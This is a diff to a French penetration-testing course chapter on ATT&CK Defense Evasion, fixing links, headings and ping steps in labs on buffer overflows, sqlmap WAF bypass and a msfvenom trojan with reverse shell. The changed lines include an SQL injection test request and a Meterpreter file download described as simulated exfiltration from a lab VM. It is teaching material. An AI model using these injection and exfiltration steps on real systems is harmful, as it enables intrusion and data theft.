@@ -17,7 +17,7 @@ Les défenses évoluent. Firewalls, WAF, IDS/IPS forment un maillage que les att
 
 Ce chapitre est centré sur la tactique **[TA0005](https://attack.mitre.org/tactics/TA0005/) Defense Evasion** (50+ techniques). Les techniques de contournement par obfuscation et exploitation mémoire y sont abordées.
 
-> **Sources :** [ATT&CK Defense Evasion](https://attack.mitre.org/tactics/[TA0005](https://attack.mitre.org/tactics/TA0005/)/). [CERT-FR](https://www.cert.ssi.gouv.fr/).
+> **Sources :** [ATT&CK Defense Evasion](https://attack.mitre.org/tactics/TA0005/). [CERT-FR](https://www.cert.ssi.gouv.fr/).
 
 ---
 
@@ -58,7 +58,7 @@ flowchart LR
 
 ## Lab 3.1 — Buffer Overflow avec pwntools
 
-###  Fiche
+### Fiche
 
 | Durée | Conteneur | Dossier | Technique ATT&CK |
 |---|---|---|---|
@@ -265,7 +265,7 @@ python3 -c "print('A'*100)" | docker exec -i buffovf-target /opt/vuln_secure 2>&
 
 ## Lab 3.2 — Contournement WAF avec sqlmap
 
-###  Fiche
+### Fiche
 
 | Durée | Conteneur | Technique ATT&CK |
 |---|---|---|
@@ -368,7 +368,7 @@ curl -s -o /dev/null -w "%{http_code}" "http://localhost:8081/?id=1%20OR%201=1"
 
 ## Lab 3.4 — Trojan Windows : génération, livraison et reverse shell
 
-###  Fiche
+### Fiche
 
 | Durée | Conteneur | Dossier | Techniques ATT&CK |
 |---|---|---|---|
@@ -394,12 +394,14 @@ echo "📌 IP Kali : $(hostname -I | awk '{print $1}')"
 # 📌 Depuis la VM Windows (PowerShell) : relever l'IP cible
 # ipconfig → noter l'adresse IPv4 (ex: 192.168.X.X)
 
-# 📌 Vérifier la connectivité : la VM doit pouvoir joindre Kali
-ping $(hostname -I | awk '{print $1}') -c 2
-# → 2 paquets reçus (la connectivité réseau est OK)
+# 📌 Depuis Kali : vérifier que la VM est joignable
+# 🔍 ping -c 2 = envoie 2 paquets ICMP puis s'arrête
+# Remplacez 192.168.X.X par l'IP de votre VM Windows
+ping -c 2 192.168.X.X
+# → 2 packets transmitted, 2 received (la connectivité réseau est OK)
 
-# 📌 De même, depuis Kali, vérifier que vous joignez la VM
-# ping 192.168.X.X  (remplacer par l'IP de votre VM)
+# 📌 Depuis la VM Windows (PowerShell) : vérifier que Kali est joignable
+# ping KALI_IP  (remplacer KALI_IP par l'IP Kali notée plus haut)
 ```
 
 ### Étape 1 — Génération du trojan avec msfvenom
@@ -523,7 +525,7 @@ meterpreter > pwd
 
 # 📌 Télécharger un fichier depuis la cible vers Kali (exfiltration simulée)
 meterpreter > download C:\Users\student\Desktop\document.txt /tmp/exfiltrated.txt
-# → [*] Downloading: /etc/passwd -> /tmp/exfiltrated_passwd.txt
+# → [*] Downloading: C:\Users\student\Desktop\document.txt -> /tmp/exfiltrated.txt
 
 # 📌 Nettoyer : supprimer le trojan de la cible
 meterpreter > rm C:\Users\student\Desktop\update_package.exe
@@ -633,7 +635,7 @@ cd /opt && gdb -q ./vuln
 
 ## Pour aller plus loin
 
-- [ATT&CK Defense Evasion ([TA0005](https://attack.mitre.org/tactics/TA0005/))](https://attack.mitre.org/tactics/[TA0005](https://attack.mitre.org/tactics/TA0005/)/)
+- [ATT&CK Defense Evasion (TA0005)](https://attack.mitre.org/tactics/TA0005/)
 - [Corelan Exploit Development](https://www.corelan.be/index.php/articles/)
 - [Awesome WAF](https://github.com/0xInfection/Awesome-WAF)
 - [CERT-FR](https://www.cert.ssi.gouv.fr/)
